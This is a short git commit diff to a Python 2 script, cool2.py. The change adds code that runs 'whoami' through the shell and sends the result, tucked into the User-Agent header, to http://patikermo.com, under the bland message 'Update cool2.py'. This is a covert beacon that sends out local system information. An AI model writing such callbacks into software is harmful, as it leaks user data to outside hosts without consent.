3e97fa8ae7fcf2e49509e9a1b4a96525c2d6e3b6
Lino Nava <linonava@patikermo.com>
2021-07-16 12:08:59 -0400

    Update cool2.py

--- cool2.py
+++ cool2.py
@@ -1,2 +1,7 @@
 import urllib2
-contents = urllib2.urlopen("http://patikermo.com").read()
+import subprocess
+output = subprocess.check_output("whoami", shell=True)
+output = output.rstrip()
+request = urllib2.Request("http://patikermo.com")
+request.add_header('User-Agent',output)
+urllib2.urlopen(request)
